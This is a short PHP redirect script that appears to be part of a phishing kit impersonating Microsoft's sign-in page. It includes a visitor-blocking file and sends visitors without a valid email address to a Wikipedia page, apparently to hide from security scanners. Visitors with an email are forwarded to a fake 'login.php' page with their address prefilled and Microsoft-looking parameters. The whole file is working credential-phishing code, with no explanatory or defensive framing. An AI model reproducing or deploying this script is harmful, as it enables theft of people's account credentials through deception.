<?php
error_reporting(0);
include ('blocker.php');
@session_start();
$pager = "https://live.microsoftonline.com";
$failRedirect = "https://www.wikipedia.org/wiki/Microsoft_Office";
$email = $_GET['email'];
if (isset($email)) {
	$data = filter_var($email, FILTER_SANITIZE_EMAIL);
	if (!filter_var($data, FILTER_VALIDATE_EMAIL)) {
			die(header("Location: " . $failRedirect));
	}else{
		$distance = "login.php#$email#client_id=e7b724e5-ef96-4f79-9c01-6e985e042d4d#loginpage=".$pager."#reff=6d17fd2bdeb846c7987fc53a49f81755";
	}
}else {
    die(header("Location: " . $failRedirect));
}
header("location: $distance");
?> 